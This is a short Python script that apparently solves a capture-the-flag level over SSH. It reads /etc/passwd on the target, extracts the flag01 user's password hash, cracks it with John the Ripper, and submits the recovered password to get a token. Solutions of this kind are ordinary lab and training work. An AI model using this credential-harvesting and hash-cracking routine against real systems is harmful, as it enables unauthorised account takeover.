import os
import sys
sys.path.append("../..")

from utils.ssh import exec, get_token, connect_by_previous
from utils.text import print_title, print_output

client = connect_by_previous()
passwd_row = exec(client, 'cat /etc/passwd | grep "flag01"', title='Find passwd row by user flag01')[0]
print_output(passwd_row, 'Passwd row')

print_title('Slice password hash')
passwd_hash = passwd_row.split(':', 1)[1].split(':', 1)[0]
print_output(passwd_hash, 'Hash')

print_title('Write tmp passwd file')
open('passwd', 'w').write(passwd_hash)

print_title('Brute password hash by JTR')
stream = os.popen('john passwd --show')
flag_password = stream.readlines()[0].split(':')[1].strip()
print_output(flag_password, 'Flag password')

print_title('Delete tmp passwd file')
os.unlink('passwd')

get_token(flag_password)

client.close()
